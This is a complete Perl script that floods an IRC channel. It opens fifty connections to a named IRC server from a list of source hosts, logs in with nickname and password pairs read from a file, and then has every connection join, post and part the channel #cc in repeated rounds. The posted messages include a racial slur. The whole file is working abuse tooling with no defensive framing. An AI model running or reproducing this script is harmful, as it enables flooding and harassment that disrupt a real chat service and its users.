#!/usr/bin/perl

use IO::Socket;

$addr="irc.starlink.ru"; # irc server
$port=6667; # port

## Flood info
$num=1; # num attacks
$nummes=2; # num attacks on channel
$users=50; # number of users
$numsym=12; # how many symbols in nickname
$hosts='hosts'; # filename with hosts
$nicks='nicks'; # filename with nicknames

@sym = ('a'..'z');

## User Information
$info="hren";
$nick="";
$channel='#cc';
$mes1='`v0id` -  russian users is not lame...';
$mes2='ultranigga-super-undefined-crew';

## Log Connection (1-yes, 0-no)
$log=0;
$|=1;

print "channel: ${channel}\n";

open (INFO, $hosts);
open (NICK, $nicks);


for ($i=0; $i<$num; $i++){
	for ($c=0; $c<$users; $c++){
		
		$host=<INFO>;
		chomp ($host);
		
		print "domain='$host' host='$addr' port='$port'\n";
		
		$sock[$c] = IO::Socket::INET->new (PeerAddr => $addr,
                           PeerPort => $port,
                           LocalAddr => $host,
                           Proto    => "tcp",
                           Type     => SOCK_STREAM);


		$sock=$sock[$c];
		print ".";		

		binmode ($sock);
		$sock->autoflush();

		$info=<NICK>;
		chomp ($info);
		($nickname, $pass)=split (/:/, $info);

		$nick[$c]=$nickname;
		$pass[$c]=$pass;
		for ($d=0; $d<$numsym; $d++){
			$ident[$c].=$sym[int(rand(28))];
		}
		
		$sock->send ("NICK $nick[$c]\r\n");
		$sock->send ("USER $ident[$c] ${host} ${addr} :${info}\r\n");

		while (<$sock>) {
			check4ping ($sock, $_);
			print $_ if $log;
			last if ($_ =~ /376/);
			exit if ($_ =~ /^ERROR/);
		}

		$sock->send ("NICKSERV identify $pass[$c]\r\n");
		while (<$sock>) {
			check4ping ($sock, $_);
			print $_ if $log; 
			last if ($_ =~ /Password accepted/i);
		}

		$sock->send ("WHO :$nick[$c]\r\n");

		while (<$sock>) {
			check4ping ($sock, $_);
			print $_ if $log; 
			last if ($_ =~ /315/);
		}

		print "nick='$nick[$c]'\n";

	}
		
	print "preparing to flood\n";
	
	for ($d=1; $d<=$nummes; $d++){
		for ($c=0; $c<$users; $c++){
			$sock=$sock[$c];
			$sock->send ("JOIN ${channel}\r\n");
	
			while (<$sock>) {
				check4ping ($sock, $_);
				print $_ if $log; 
				last if ($_ =~ /End of \/?NAMES list/i);
			}
		}
		
		for ($c=0; $c<$users; $c++){
			$sock=$sock[$c];
			select (undef, undef, undef, .1);
			$sock->send ("PRIVMSG ${channel} :${mes1}\r\n");
			select (undef, undef, undef, .1);
		}

		for ($c=0; $c<$users; $c++){
			$sock=$sock[$c];
			select (undef, undef, undef, .1);
			$sock->send ("PART ${channel} :${mes2}\r\n");
			select (undef, undef, undef, .1);
		}
		
		select (undef, undef, undef, 3);

	}
	
	select (undef, undef, undef, 1);

	for ($c=0; $c<$users; $c++){
		$sock=$sock[$c];
		close ($sock);
	}

}

close (INFO);


## Test for PING
sub check4ping{
	my ($sock, $data)=@_;
	my ($dop, $server);

	if ($data =~ /^PING/i) {
		($dop, $server) = split (/:/, $data);
		$sock->send ("PONG $server\r\n");
	}
}
